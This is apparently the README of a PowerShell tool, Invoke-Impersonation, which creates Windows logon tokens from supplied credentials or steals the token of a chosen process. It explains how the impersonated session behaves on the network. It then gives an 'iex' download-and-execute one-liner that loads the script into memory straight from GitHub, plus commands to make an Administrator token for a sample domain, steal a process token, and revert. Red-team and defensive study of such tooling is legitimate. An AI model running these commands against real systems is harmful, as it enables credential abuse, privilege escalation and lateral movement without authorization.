# Invoke-Impersonation
Make a Token (local admin rights not required) or Steal the Token of the specified Process ID (local admin rights required)

### Note:

The logon session created has the same local identifier as the caller. If you run commands that access local resources (like whoami), they will appear to be run under the original user context. 

This is because, locally, nothing has changed. The LUID is the same as the caller, so it appears as though you're still the original user.

However, the alternate credentials are used when accessing a remote resource.

This logon type is designed specifically for cases where you need to specify alternate credentials for outbound network connections, without affecting the local user context. 

This also means that the created token is not applicable to anything you may want to run on the current machine.

Use `Rev2Self` to drop any impersonation that may be in play.

### Load in memory
```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Invoke-Impersonation/main/Invoke-Impersonation.ps1')
```

### Make a token
```
Invoke-Impersonation -MakeToken -Username "Administrator" -Domain "ferrari.local" -Password "P@ssw0rd!"
```

### Steal a token
```
Invoke-Impersonation -Steal -ProcessID 5380
```

### Rev2Self
```
Invoke-Impersonation -Rev2Self
```

![image](https://github.com/Leo4j/Invoke-Impersonation/assets/61951374/c20851d7-7d19-4e89-a5ad-2ecd45ef3cbf)

![image](https://github.com/Leo4j/Invoke-Impersonation/assets/61951374/c5f0d863-39e0-4441-b381-6586f12b0b68)


